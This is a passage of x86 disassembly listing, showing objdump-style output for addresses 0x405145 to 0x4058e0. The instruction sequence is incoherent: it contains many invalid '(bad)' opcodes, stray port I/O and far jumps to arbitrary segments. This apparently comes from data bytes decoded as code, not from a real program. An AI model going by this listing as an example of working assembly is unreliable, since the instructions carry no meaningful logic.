  405145:	cmp    DWORD PTR [esi],esp
  405147:	xor    BYTE PTR [esp+edi*1],0x28
  40514b:	inc    edx
  40514c:	mov    esp,0xa5b3baaf
  405151:	adc    bh,BYTE PTR [ebx]
  405153:	stos   BYTE PTR es:[edi],al
  405154:	bts    ebp,esp
  405157:	and    eax,0x55c3535d
  40515c:	xchg   edx,eax
  40515d:	mov    eax,DWORD PTR [esi-0x4b131be0]
  405163:	cld    
  405164:	mov    bh,0x84
  405166:	(bad)  
  405167:	dec    esi
  405168:	nop
  405169:	outs   dx,BYTE PTR ds:[esi]
  40516a:	outs   dx,DWORD PTR ds:[esi]
  40516b:	lods   al,BYTE PTR ds:[esi]
  40516c:	xchg   esp,eax
  40516d:	inc    ebp
  40516e:	mov    esp,0xc031a927
  405173:	add    al,0x4f
  405175:	das    
  405176:	stos   DWORD PTR es:[edi],eax
  405177:	sbb    eax,0xbabd9d97
  40517c:	dec    ebx
  40517d:	adc    DWORD PTR [ecx-0x5c],0x65
  405181:	pop    esp
  405182:	mov    BYTE PTR [ecx],al
  405184:	jg     0x405150
  405186:	sub    ecx,DWORD PTR [esi+0x6977739d]
  40518c:	dec    esi
  40518d:	mov    dl,0xaf
  40518f:	lods   al,BYTE PTR ds:[esi]
  405190:	leave  
  405191:	jne    0x405209
  405193:	adc    BYTE PTR [ecx-0x4232d794],bh
  405199:	cmp    ch,ah
  40519b:	mov    dl,0x57
  40519d:	mov    cl,0x3b
  40519f:	xchg   esi,eax
  4051a0:	pop    es
  4051a1:	mov    esp,DWORD PTR [esi+0x59b787eb]
  4051a7:	(bad)  
  4051a8:	xchg   ebp,eax
  4051a9:	and    al,0x5b
  4051ab:	lds    ecx,FWORD PTR [edi+0x291321c4]
  4051b1:	add    al,0xdd
  4051b3:	pop    ebx
  4051b4:	and    ah,BYTE PTR [eax+0x1a26826a]
  4051ba:	lods   al,BYTE PTR ds:[esi]
  4051bb:	int    0x52
  4051bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051be:	xchg   BYTE PTR [esi+0x1],cl
  4051c1:	dec    ecx
  4051c2:	into   
  4051c3:	call   0x85cb1c99
  4051c8:	mov    ebp,0x4a1cc0b2
  4051cd:	or     BYTE PTR [eax+0x56],0xcf
  4051d1:	xchg   edi,eax
  4051d2:	into   
  4051d3:	jno    0x40515b
  4051d5:	sbb    eax,0x2aebe981
  4051da:	mov    eax,0x8a8d02eb
  4051df:	shl    DWORD PTR [edi+edx*4+0x5fd25d69],0xbe
  4051e7:	fistp  QWORD PTR [edx+0x46]
  4051ea:	mov    esp,0x5c1a5926
  4051ef:	mov    bh,0xb1
  4051f1:	xor    al,0xfe
  4051f3:	gs pop ss
  4051f5:	xor    BYTE PTR [esi-0x44951aa1],cl
  4051fb:	cmp    dl,dh
  4051fd:	xchg   ecx,eax
  4051fe:	mov    ds:0x8362f14e,eax
  405203:	rcl    BYTE PTR [ecx+0x54],1
  405206:	inc    esp
  405207:	iret   
  405208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405209:	mov    ah,0xd9
  40520b:	or     ah,BYTE PTR [ebp+0x7c]
  40520e:	(bad)  
  40520f:	pusha  
  405210:	xchg   ecx,eax
  405211:	pusha  
  405212:	int    0x63
  405214:	lock dec BYTE PTR [edi]
  405217:	cmp    BYTE PTR fs:[edi+0x7fb1340f],bl
  40521e:	sbb    ah,bh
  405220:	int    0x6a
  405222:	cmp    eax,eax
  405224:	(bad)  
  405225:	xchg   eax,edx
  405227:	xchg   edi,eax
  405228:	add    BYTE PTR [esi],ch
  40522a:	rol    DWORD PTR [eax-0x7e],cl
  40522d:	stos   BYTE PTR es:[edi],al
  40522e:	inc    eax
  40522f:	pop    ds
  405230:	ins    BYTE PTR es:[edi],dx
  405231:	in     al,dx
  405232:	or     al,0x56
  405234:	mov    bl,0x22
  405236:	push   eax
  405237:	xchg   esi,eax
  405238:	mov    esp,edx
  40523a:	add    ebx,DWORD PTR [edi+eax*8-0x4863c87]
  405241:	sti    
  405242:	retf   
  405243:	dec    ebp
  405244:	sub    eax,0x7160ab54
  405249:	xor    eax,0x2c7aaa16
  40524e:	push   esi
  40524f:	pop    ebx
  405250:	ss loopne 0x4051f9
  405253:	mov    bh,0x71
  405255:	(bad)  [ebx-0x79]
  405258:	in     eax,dx
  405259:	adc    ecx,ebx
  40525b:	mov    ch,0xae
  40525d:	mov    dh,BYTE PTR [esi*8+0x1c8445b4]
  405264:	ins    BYTE PTR es:[edi],dx
  405265:	out    dx,eax
  405266:	push   esi
  405267:	sbb    al,0xd4
  405269:	outs   dx,DWORD PTR ds:[esi]
  40526a:	(bad)  
  40526b:	rol    DWORD PTR [ebp-0x2f],cl
  40526e:	pusha  
  40526f:	push   0x17
  405271:	mov    ds:0x50aafd13,al
  405276:	ins    BYTE PTR es:[edi],dx
  405277:	and    DWORD PTR [bx+si+0x5c],esi
  40527b:	cs jecxz 0x405249
  40527e:	iret   
  40527f:	enter  0x89e4,0xfe
  405283:	dec    ebp
  405284:	inc    esp
  405285:	fdivr  DWORD PTR [ebp-0x5a]
  405288:	pop    es
  405289:	jns    0x405307
  40528b:	fistp  QWORD PTR [edx+0x60]
  40528e:	pop    esi
  40528f:	push   eax
  405290:	stos   DWORD PTR es:[edi],eax
  405291:	aam    0xf6
  405293:	xor    BYTE PTR [eax+0x39],ch
  405296:	sub    ebx,DWORD PTR [ebx+0x22]
  405299:	inc    edi
  40529a:	xor    ch,BYTE PTR [ebp+0x12a62489]
  4052a0:	int    0xfa
  4052a2:	retf   
  4052a3:	xchg   ebx,eax
  4052a4:	mov    BYTE PTR [esi],cl
  4052a6:	mov    esi,DWORD PTR [ebx+0x70]
  4052a9:	cwde   
  4052aa:	dec    ebx
  4052ab:	lods   eax,DWORD PTR ds:[esi]
  4052ac:	push   ebx
  4052ad:	push   ecx
  4052ae:	pop    ds
  4052af:	cdq    
  4052b0:	lahf   
  4052b1:	neg    DWORD PTR [ecx+0x0]
  4052b4:	push   ecx
  4052b5:	and    eax,0x27a6453b
  4052ba:	in     al,0xe0
  4052bc:	sti    
  4052bd:	push   ss
  4052be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052bf:	jae    0x4052d8
  4052c1:	sbb    BYTE PTR [ebx],al
  4052c3:	aas    
  4052c4:	mov    esp,0x1ee983d2
  4052c9:	and    ch,bh
  4052cb:	int3   
  4052cc:	push   ebx
  4052cd:	imul   ebx,DWORD PTR [bp+di],0xffffffde
  4052d1:	test   BYTE PTR [edi],dl
  4052d3:	sahf   
  4052d4:	mov    esp,DWORD PTR [ecx-0x7f]
  4052d7:	enter  0x885c,0x1d
  4052db:	push   edx
  4052dc:	jns    0x4052bc
  4052de:	sar    edi,1
  4052e0:	out    dx,eax
  4052e1:	xchg   BYTE PTR [ebp-0x41],ah
  4052e4:	aad    0xdd
  4052e6:	stos   BYTE PTR es:[edi],al
  4052e7:	sbb    BYTE PTR [esi],ah
  4052e9:	mov    ds:0x66a7ebd8,eax
  4052ee:	(bad)  [ebx+0x1ec30acd]
  4052f4:	imul   ebp,DWORD PTR [esi-0x1846d6be],0x0
  4052fb:	sub    bl,0xee
  4052fe:	push   ss
  4052ff:	mov    esi,0x89a098ef
  405304:	xchg   ebx,eax
  405305:	scas   eax,DWORD PTR es:[edi]
  405306:	dec    ebp
  405307:	mov    edx,DWORD PTR [ecx+0x168a5e18]
  40530d:	or     DWORD PTR [ebx-0x17],edx
  405310:	and    ah,ah
  405312:	ret    0x748
  405315:	fnstenv [edi]
  405317:	inc    edi
  405318:	sbb    eax,0x76267d9b
  40531d:	and    BYTE PTR [edi],0xc0
  405320:	outs   dx,DWORD PTR ds:[esi]
  405321:	lods   eax,DWORD PTR ds:[esi]
  405322:	loopne 0x4052ae
  405324:	aad    0xec
  405326:	ficom  WORD PTR [edx+0x22]
  405329:	lahf   
  40532a:	and    al,0x2e
  40532c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40532d:	lods   eax,DWORD PTR ds:[esi]
  40532e:	sbb    DWORD PTR [ecx+0x43],esp
  405331:	xor    bh,ch
  405333:	push   ds
  405334:	into   
  405335:	fild   QWORD PTR [edi-0x1cbb188]
  40533b:	cmp    bl,dl
  40533d:	or     eax,0x1133093
  405342:	dec    esp
  405343:	xchg   BYTE PTR [ecx+0x5b6d6556],ch
  405349:	repz aam 0x9a
  40534c:	pop    ebx
  40534d:	mov    es,WORD PTR [edi+0x34967799]
  405353:	mov    DWORD PTR [esi],edx
  405355:	xor    edx,edx
  405357:	xchg   esp,edi
  405359:	out    0xdd,al
  40535b:	adc    ecx,eax
  40535d:	or     eax,DWORD PTR [eax]
  40535f:	ret    0x908f
  405362:	pop    ebx
  405363:	ret    0x7e5a
  405366:	inc    ebp
  405367:	mov    al,ds:0xec16fec6
  40536c:	hlt    
  40536d:	addr16 cwde 
  40536f:	aaa    
  405370:	push   ebx
  405371:	je     0x405326
  405373:	ret    0x62ee
  405376:	lahf   
  405377:	cmp    DWORD PTR [esi],eax
  405379:	jo     0x4052ff
  40537b:	and    eax,0xdffa8def
  405380:	add    al,0xb5
  405382:	cld    
  405383:	xchg   edx,eax
  405384:	idiv   DWORD PTR [ecx-0xe0c5986]
  40538a:	xor    eax,0x501af8bf
  40538f:	lods   al,BYTE PTR ds:[esi]
  405390:	idiv   esi
  405392:	sbb    esp,edx
  405394:	or     DWORD PTR [bp+si],0x5a
  405398:	fwait
  405399:	ins    DWORD PTR es:[edi],dx
  40539a:	pop    ds
  40539b:	mov    edi,edx
  40539d:	mov    eax,0x49eed4cf
  4053a2:	jmp    0xcf4f3bcb
  4053a7:	loope  0x40537c
  4053a9:	jmp    0x4053cd
  4053ab:	mov    ch,0xff
  4053ad:	jmp    0x4053a1
  4053af:	push   edx
  4053b0:	mov    cl,0xc9
  4053b2:	dec    esi
  4053b3:	inc    edx
  4053b4:	leave  
  4053b5:	mov    ds:0x6bd8c38c,al
  4053ba:	jae    0x4053bb
  4053bc:	cdq    
  4053bd:	sahf   
  4053be:	mov    ds:0xa352e7b3,eax
  4053c3:	mov    bh,BYTE PTR [esi-0x5dc53525]
  4053c9:	popa   
  4053ca:	mov    al,0x7c
  4053cc:	push   cs
  4053cd:	pop    esi
  4053ce:	(bad)  
  4053cf:	ss adc al,0x52
  4053d2:	arpl   bx,ax
  4053d4:	adc    dh,bh
  4053d6:	or     al,0xd
  4053d8:	sbb    BYTE PTR cs:[ebp-0x179cc2ad],dl
  4053df:	test   al,0xd3
  4053e1:	push   ebp
  4053e2:	ins    BYTE PTR es:[edi],dx
  4053e3:	pop    ds
  4053e4:	repnz add DWORD PTR [ebx],esp
  4053e7:	das    
  4053e8:	push   ebp
  4053e9:	jmp    0xaaa9:0xf8882841
  4053f0:	push   ebx
  4053f1:	or     ebp,esp
  4053f3:	push   edi
  4053f4:	jo     0x40538e
  4053f6:	sub    DWORD PTR ds:0x11e3a103,edx
  4053fc:	loop   0x40543d
  4053fe:	inc    esp
  4053ff:	cmp    DWORD PTR [ebp+0x19],edx
  405402:	cdq    
  405403:	dec    esp
  405404:	jmp    0x405396
  405406:	call   0x792b:0xd81b01b4
  40540d:	cmc    
  40540e:	out    0xc5,al
  405410:	and    al,0xe5
  405412:	mov    eax,0x11a2e83a
  405417:	fwait
  405418:	sub    ah,BYTE PTR [ebx+0x6561a79e]
  40541e:	inc    ebp
  40541f:	sbb    al,0x6e
  405421:	jne    0x40547f
  405423:	mov    ds:0xcb297552,al
  405428:	mov    esi,0x8544a972
  40542d:	mov    al,0x4a
  40542f:	ret    0x62c6
  405432:	out    0xdb,al
  405434:	loopne 0x405420
  405436:	out    0xef,al
  405438:	outs   dx,DWORD PTR ds:[esi]
  405439:	jge    0x405442
  40543b:	cdq    
  40543c:	xchg   BYTE PTR [edx-0x6b],dh
  40543f:	mov    ebx,0xc84c203e
  405444:	inc    esp
  405445:	jp     0x405453
  405447:	sub    eax,0x20f0df87
  40544c:	adc    DWORD PTR [esi+0x72],eax
  40544f:	lea    esi,[ecx+0x6d]
  405452:	loopne 0x40548d
  405454:	dec    ebx
  405455:	pop    ecx
  405456:	pop    ds
  405457:	aas    
  405458:	or     al,0xe5
  40545a:	sub    BYTE PTR [eax],bl
  40545c:	imul   ecx,ecx,0xffffffa3
  40545f:	sahf   
  405460:	dec    esi
  405461:	bound  esi,QWORD PTR [edx]
  405463:	mov    ds,WORD PTR [esi+0x2b]
  405466:	(bad)  
  405467:	int3   
  405468:	mov    dl,0x60
  40546a:	test   BYTE PTR [edi+eiz*1-0x52],ah
  40546e:	call   0x16cd:0x6b962eab
  405475:	jp     0x405415
  405477:	(bad)  
  405478:	mov    ch,0x23
  40547a:	dec    ebx
  40547b:	(bad)  [esi-0x54aaa170]
  405481:	not    cl
  405483:	pop    ss
  405484:	jbe    0x40541f
  405486:	sahf   
  405487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405489:	xor    dh,BYTE PTR [edi]
  40548b:	ss ss popf 
  40548e:	jg     0x405412
  405490:	pop    es
  405491:	popa   
  405492:	dec    ebx
  405493:	(bad)  
  405494:	enter  0xc1f2,0xec
  405498:	mov    bl,BYTE PTR [edx-0x67]
  40549b:	add    BYTE PTR [ebx-0x68],dl
  40549e:	push   0x28
  4054a0:	not    BYTE PTR [eax+ecx*2-0x2e]
  4054a4:	sub    ch,BYTE PTR [edx]
  4054a6:	sti    
  4054a7:	out    dx,al
  4054a8:	test   eax,0x3dd8e140
  4054ad:	pop    ebx
  4054ae:	sahf   
  4054af:	jb     0x40546f
  4054b1:	sub    DWORD PTR [edx+0x4a],0x30
  4054b5:	cdq    
  4054b6:	sub    bl,BYTE PTR ds:0xe9bcfab3
  4054bc:	neg    BYTE PTR [edi+0x741a2255]
  4054c2:	inc    esi
  4054c3:	js     0x40549d
  4054c5:	add    eax,esp
  4054c7:	dec    ebx
  4054c8:	jle    0x40549f
  4054ca:	pop    esi
  4054cb:	jbe    0x4054bf
  4054cd:	frstor [ebx+0x6d]
  4054d0:	pop    esp
  4054d1:	enter  0x574d,0x95
  4054d5:	jecxz  0x4054fc
  4054d7:	or     BYTE PTR [ebx],dh
  4054d9:	imul   ebx,DWORD PTR [edi+eax*4+0x5e],0x4f
  4054de:	jb     0x4054a6
  4054e0:	test   ah,0xfd
  4054e3:	xchg   edi,eax
  4054e4:	or     al,0xcc
  4054e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054e7:	in     al,dx
  4054e8:	or     BYTE PTR [eax+0x39a295a4],cl
  4054ee:	mov    ch,0x5a
  4054f0:	clc    
  4054f1:	ins    BYTE PTR es:[edi],dx
  4054f2:	mov    ecx,ss
  4054f4:	push   ecx
  4054f5:	cmp    eax,0x841a56d4
  4054fa:	xchg   esi,eax
  4054fb:	rcl    BYTE PTR [ebx-0x19],cl
  4054fe:	push   DWORD PTR [esi-0x4c]
  405501:	xchg   esp,eax
  405502:	mov    esi,0x5b47189a
  405507:	aad    0x17
  405509:	or     BYTE PTR [edi-0x51207ff0],al
  40550f:	push   edx
  405510:	ds int 0x69
  405513:	rcl    ch,0xd4
  405516:	out    dx,al
  405517:	inc    ebx
  405518:	inc    DWORD PTR [edi]
  40551a:	iret   
  40551b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40551d:	mov    ah,0x1a
  40551f:	push   esi
  405520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405521:	aad    0xcf
  405523:	sbb    eax,0xda700ded
  405528:	lods   al,BYTE PTR ds:[esi]
  405529:	loope  0x405528
  40552b:	add    BYTE PTR [eax],bl
  40552d:	add    BYTE PTR [esi+0x65],dl
  405530:	pop    ecx
  405531:	into   
  405532:	mov    cl,0xb1
  405534:	mov    eax,ds:0xf0517eb5
  405539:	dec    edx
  40553a:	mov    WORD PTR [ecx+ecx*2+0x21],ss
  40553e:	jl     0x405562
  405540:	or     edi,DWORD PTR [ecx]
  405542:	inc    esp
  405543:	inc    esi
  405544:	mov    al,ds:0xbfaee8cf
  405549:	adc    cl,BYTE PTR [edi+0x70]
  40554c:	mov    edx,0x81d4cb44
  405551:	and    ch,ah
  405553:	sbb    ebx,edx
  405555:	sub    BYTE PTR [esi-0x12],dl
  405558:	xchg   esi,eax
  405559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40555a:	sub    bh,BYTE PTR [ecx]
  40555c:	out    dx,al
  40555d:	(bad)  [eax-0x22]
  405560:	and    al,0x16
  405562:	lock std 
  405564:	call   0xd74c:0x91724cb
  40556b:	aas    
  40556c:	loop   0x405551
  40556e:	into   
  40556f:	jne    0x4054ff
  405571:	push   esp
  405572:	(bad)  
  405573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405575:	cmc    
  405576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405577:	aaa    
  405578:	mov    al,ds:0x5d90d3b5
  40557d:	mov    ds:0xa29d27b5,al
  405582:	lds    eax,FWORD PTR [edi+0x6e]
  405585:	mov    ds:0xe7ee00c3,eax
  40558a:	push   edi
  40558b:	dec    ebp
  40558c:	mov    eax,0x274dd66c
  405591:	adc    DWORD PTR [ebp-0xf],0x35
  405595:	fdiv   QWORD PTR [ecx+0x64]
  405598:	stos   DWORD PTR es:[edi],eax
  405599:	cmp    dl,bh
  40559b:	pop    es
  40559c:	hlt    
  40559d:	push   esp
  40559e:	ins    DWORD PTR es:[edi],dx
  40559f:	or     ah,BYTE PTR gs:[ebx+ebp*8]
  4055a3:	xchg   ebx,eax
  4055a4:	xor    DWORD PTR [ebp+0x59f15e64],ebp
  4055aa:	pop    edx
  4055ab:	in     al,dx
  4055ac:	xor    DWORD PTR [ebx+ebp*2-0x5e],ebp
  4055b0:	bound  esp,QWORD PTR [eax-0x71b21bbd]
  4055b6:	fisubr WORD PTR [edx]
  4055b8:	shl    BYTE PTR [eax+0x17663502],cl
  4055be:	jno    0x4055d2
  4055c0:	sbb    cl,BYTE PTR [edi-0x6d]
  4055c3:	fisttp DWORD PTR [ebp+0x596b9213]
  4055c9:	shl    BYTE PTR [esi-0x743bc1f6],0x9d
  4055d0:	dec    esi
  4055d1:	rcr    DWORD PTR [edx+0x35e229f3],cl
  4055d7:	popw   ss
  4055d9:	cmp    DWORD PTR ds:0x801521f2,0x78511586
  4055e3:	xchg   ebx,eax
  4055e4:	neg    ebp
  4055e6:	dec    ecx
  4055e7:	mov    ecx,0xacde8cae
  4055ec:	or     BYTE PTR [eax],cl
  4055ee:	mov    eax,ds:0x4220d0a
  4055f3:	dec    edx
  4055f4:	dec    ebx
  4055f5:	shl    bl,1
  4055f7:	pusha  
  4055f8:	out    dx,eax
  4055f9:	ss or  al,0x95
  4055fc:	cld    
  4055fd:	mov    dl,0x2b
  4055ff:	sub    al,0x3e
  405601:	fisub  DWORD PTR [ebx]
  405603:	fidivr WORD PTR [ebx+edi*4-0x4a]
  405607:	mov    ch,0xe9
  405609:	mov    edx,0x59b706fb
  40560e:	xchg   ebp,eax
  40560f:	jmp    0x544b4c53
  405614:	repnz mov dh,0x35
  405617:	aaa    
  405618:	fild   WORD PTR [eax]
  40561a:	popf   
  40561b:	dec    ebx
  40561c:	scas   al,BYTE PTR es:[edi]
  40561d:	in     al,0xc0
  40561f:	ins    DWORD PTR es:[edi],dx
  405620:	inc    esp
  405621:	or     al,0x94
  405623:	scas   al,BYTE PTR es:[edi]
  405624:	inc    ecx
  405625:	inc    ebx
  405626:	test   bl,dl
  405628:	xor    dl,BYTE PTR [eax]
  40562a:	push   ecx
  40562b:	ret    
  40562c:	push   0xffffffb3
  40562e:	dec    edx
  40562f:	dec    esi
  405630:	mov    edi,0x728cac34
  405635:	scas   al,BYTE PTR es:[edi]
  405636:	sub    DWORD PTR [ebp-0x4440eddd],0xffffffbd
  40563d:	cmp    ch,ah
  40563f:	pop    ebp
  405640:	push   ebx
  405641:	in     al,0xbe
  405643:	sub    eax,0x129fa640
  405648:	pop    ebp
  405649:	(bad)  
  40564a:	aad    0xaf
  40564c:	xchg   ebp,eax
  40564d:	xor    BYTE PTR [eax-0x41],al
  405650:	(bad)  
  405651:	cmp    BYTE PTR [esp+esi*1],ch
  405654:	mov    bl,0x7e
  405656:	ja     0x4056b2
  405658:	or     al,0x66
  40565a:	mov    ebp,DWORD PTR [edi-0x433257a6]
  405660:	xor    bl,dl
  405662:	aas    
  405663:	mov    al,0x9c
  405665:	mov    ah,0xc1
  405667:	adc    BYTE PTR [edx],ah
  405669:	cmc    
  40566a:	or     DWORD PTR [edi+0x449e0f07],ebx
  405670:	or     eax,0x128b2b09
  405675:	pop    ds
  405676:	aas    
  405677:	test   DWORD PTR [edx],esp
  405679:	cmp    DWORD PTR [edx],esi
  40567b:	xor    ecx,DWORD PTR [esi]
  40567d:	shl    DWORD PTR [ebx-0x58f605b2],1
  405683:	adc    ebx,DWORD PTR [esi]
  405685:	jg     0x405614
  405687:	popa   
  405688:	and    al,0xb7
  40568a:	test   esp,esp
  40568c:	cmp    eax,0xb2b476dd
  405691:	aas    
  405692:	pusha  
  405693:	xor    al,0x39
  405695:	push   0xffffffd8
  405697:	push   ebp
  405698:	sub    esi,DWORD PTR [eax-0x5c0167e7]
  40569e:	or     al,cl
  4056a0:	push   ebp
  4056a1:	or     al,0x5e
  4056a3:	and    ebx,DWORD PTR [edi]
  4056a5:	jp     0x4056d4
  4056a7:	jmp    0xdbe9:0xc1a2dcd0
  4056ae:	cmc    
  4056af:	inc    edi
  4056b0:	int3   
  4056b1:	and    eax,0xef23a5ca
  4056b6:	or     DWORD PTR [edx],edi
  4056b8:	pop    eax
  4056b9:	and    al,0xcd
  4056bb:	dec    ebx
  4056bc:	jb     0x4056f8
  4056be:	data16 adc BYTE PTR [ecx-0x44565d3],dh
  4056c5:	mov    BYTE PTR [edi-0x4f4b7b40],dl
  4056cb:	bound  ecx,QWORD PTR [edi]
  4056cd:	xor    eax,0x3beae0a1
  4056d2:	jge    0x4056b8
  4056d4:	dec    edi
  4056d5:	adc    BYTE PTR [esp-0x5c],ch
  4056d9:	test   eax,0x118d3066
  4056de:	ret    0x15bb
  4056e1:	fs addr16 (bad) 
  4056e4:	fimul  DWORD PTR [edi]
  4056e6:	ret    
  4056e7:	addr16 push ss
  4056e9:	mov    ecx,0x7756c28c
  4056ee:	add    BYTE PTR [ebx],dl
  4056f0:	lods   al,BYTE PTR ds:[esi]
  4056f1:	mov    ah,0x24
  4056f3:	mov    ch,BYTE PTR [ecx-0x38302941]
  4056f9:	jb     0x40573b
  4056fb:	adc    eax,0x36268dfd
  405700:	mov    ch,0x2f
  405702:	jno    0x4056cb
  405704:	jl     0x40570b
  405706:	test   al,0x6d
  405708:	push   edi
  405709:	pop    ds
  40570a:	jns    0x405780
  40570c:	aad    0x26
  40570e:	test   eax,0x5a664ee5
  405713:	(bad)  
  405714:	fdivr  st(2),st
  405716:	mov    al,0x2
  405718:	test   DWORD PTR [esi],0x15831bfa
  40571e:	(bad)  
  40571f:	(bad)  
  405720:	das    
  405721:	adc    DWORD PTR [edx-0x170aff95],ebx
  405727:	pop    esp
  405728:	adc    edx,esp
  40572a:	imul   ebp,DWORD PTR [eax+edx*8],0x36
  40572e:	xchg   edx,eax
  40572f:	ficomp WORD PTR [edx-0x2d73d71c]
  405735:	jnp    0x40577a
  405737:	nop
  405738:	and    bl,BYTE PTR [edx]
  40573a:	xor    eax,0x1d497a38
  40573f:	ins    BYTE PTR es:[edi],dx
  405740:	fcmovbe st,st(2)
  405742:	mov    edx,0x30f2ee05
  405747:	cmp    DWORD PTR [ebp+0x68],ecx
  40574a:	add    al,0xb3
  40574c:	stos   BYTE PTR es:[edi],al
  40574d:	mov    dh,0x2e
  40574f:	pop    esp
  405750:	sbb    BYTE PTR [ebx-0x2391324],dl
  405756:	adc    BYTE PTR ds:0xbf8bca81,0xaf
  40575d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40575e:	or     al,0x2a
  405760:	(bad)  
  405761:	and    DWORD PTR [ecx-0x3a],edx
  405764:	ja     0x405757
  405766:	pop    ss
  405767:	out    dx,eax
  405768:	cmp    ebp,0x65989c1d
  40576e:	mov    fs,WORD PTR [ecx-0x54fc465d]
  405774:	xor    DWORD PTR [eax+esi*1],esi
  405777:	push   0x11b136dd
  40577c:	es test al,0xfd
  40577f:	jle    0x40577b
  405781:	mov    ch,0x9d
  405783:	push   0x3808eed2
  405788:	mov    ah,0xfe
  40578a:	jae    0x4057f5
  40578c:	out    dx,al
  40578d:	fistp  QWORD PTR [edx-0x14f6f76]
  405793:	cmp    edi,DWORD PTR [esi-0x2d041deb]
  405799:	push   cs
  40579a:	cmp    bl,BYTE PTR [esi]
  40579c:	xchg   ebx,eax
  40579d:	mov    al,0x2f
  40579f:	daa    
  4057a0:	call   0xe75e:0xa3edef7d
  4057a7:	sub    eax,0x652c8430
  4057ac:	push   0xffffffd1
  4057ae:	jmp    0x40577a
  4057b0:	fld    st(0)
  4057b2:	rol    BYTE PTR [esi+ebx*2-0x73],cl
  4057b6:	or     bh,BYTE PTR [edi+0x3f03d37f]
  4057bc:	leave  
  4057bd:	stos   DWORD PTR es:[edi],eax
  4057be:	pop    edi
  4057bf:	and    DWORD PTR [esp+ebx*8],ebx
  4057c2:	lock sbb eax,0x864e7d16
  4057c8:	sbb    DWORD PTR [eax+0x42],esi
  4057cb:	data16 and ah,BYTE PTR [edx-0x2]
  4057cf:	push   edx
  4057d0:	fcom   QWORD PTR [eax+0x11533285]
  4057d6:	(bad)  
  4057d7:	mov    bh,0xdd
  4057d9:	push   ebp
  4057da:	add    al,0x1c
  4057dc:	cld    
  4057dd:	xlat   BYTE PTR ds:[ebx]
  4057de:	dec    ebx
  4057df:	push   eax
  4057e0:	jnp    0x405827
  4057e2:	fild   DWORD PTR [edi]
  4057e4:	adc    al,0xa4
  4057e6:	pop    ebp
  4057e7:	mov    ah,0x7b
  4057e9:	pop    esi
  4057ea:	shl    edx,0x45
  4057ed:	sub    ebp,ecx
  4057ef:	add    bl,BYTE PTR [esi-0x73313fae]
  4057f5:	ja     0x4057e0
  4057f7:	es add eax,0x53ea66cc
  4057fd:	and    ecx,DWORD PTR [esi+ebp*4+0x390a7b3d]
  405804:	mov    cl,0xd
  405806:	sub    dh,BYTE PTR [ebp+0x74]
  405809:	repnz mov dl,0xd1
  40580c:	sub    BYTE PTR [ebx-0x59],dh
  40580f:	mov    al,0x96
  405811:	mov    ah,0xd6
  405813:	sub    eax,0xe1de0398
  405818:	pop    esi
  405819:	addr16 jg 0x405875
  40581c:	(bad)  
  40581e:	and    eax,DWORD PTR [ebp+0x1924d3fa]
  405824:	inc    esp
  405825:	or     ebx,ecx
  405827:	add    eax,0xd4337ee5
  40582c:	fmul   QWORD PTR [ebx-0x22]
  40582f:	ret    0x1a7a
  405832:	js     0x405822
  405834:	and    dl,BYTE PTR [esi]
  405836:	push   0x2ad303ee
  40583b:	mov    ch,0xc4
  40583d:	sbb    BYTE PTR [edi-0xb],ch
  405840:	mov    ch,0xaa
  405842:	adc    al,bl
  405844:	out    dx,al
  405845:	fs cld 
  405847:	adc    DWORD PTR [ebp+0x45e6cb3b],ebx
  40584d:	sub    al,0x2b
  40584f:	pop    ss
  405850:	mov    bl,0xee
  405852:	xchg   ecx,ebx
  405854:	loope  0x4057e6
  405856:	stos   BYTE PTR es:[edi],al
  405857:	or     BYTE PTR [eax-0x4a],cl
  40585a:	scas   eax,DWORD PTR es:[edi]
  40585b:	fistp  DWORD PTR ds:0x28afb2a3
  405861:	xchg   edi,eax
  405862:	xchg   edi,esi
  405864:	js     0x405893
  405866:	fs daa 
  405868:	les    ecx,FWORD PTR [edx+0x4ade746a]
  40586e:	es xchg ecx,eax
  405870:	pop    es
  405871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405872:	mov    esp,esp
  405874:	pop    ds
  405875:	jbe    0x40585e
  405877:	jnp    0x405865
  405879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40587a:	pop    es
  40587b:	jnp    0x40584d
  40587d:	cdq    
  40587e:	pop    edx
  40587f:	bound  ecx,QWORD PTR [ebx+0x7c21448d]
  405885:	push   es
  405886:	fistp  QWORD PTR [esi+esi*8-0x140458d9]
  40588d:	xchg   ebx,eax
  40588e:	arpl   WORD PTR [eiz*2+0x6d3f63de],cx
  405895:	sub    ah,BYTE PTR [edi+esi*8+0x59bdd953]
  40589c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40589d:	ret    
  40589e:	dec    edi
  40589f:	fldenv [esi]
  4058a1:	xchg   esi,eax
  4058a2:	leave  
  4058a3:	sub    edx,DWORD PTR [esi]
  4058a5:	push   0xe
  4058a7:	sbb    eax,0xf4ae493f
  4058ac:	ficomp WORD PTR [edi+esi*8-0x4b]
  4058b0:	out    0xdf,al
  4058b2:	jle    0x4058b9
  4058b4:	enter  0x346d,0xf
  4058b8:	adc    al,0xa1
  4058ba:	data16 adc al,0xff
  4058bd:	jmp    0xf230:0x94e83ba8
  4058c4:	push   ecx
  4058c5:	xchg   ecx,eax
  4058c6:	or     DWORD PTR [eax-0x2815739c],edi
  4058cc:	sub    esi,edx
  4058ce:	hlt    
  4058cf:	cdq    
  4058d0:	lahf   
  4058d1:	jbe    0x4058ef
  4058d3:	(bad)  
  4058d5:	sti    
  4058d6:	xchg   edx,eax
  4058d7:	aad    0x6c
  4058d9:	adc    esi,DWORD PTR [edi-0x3d31d764]
  4058df:	iret   
  4058e0:	je     0x405905
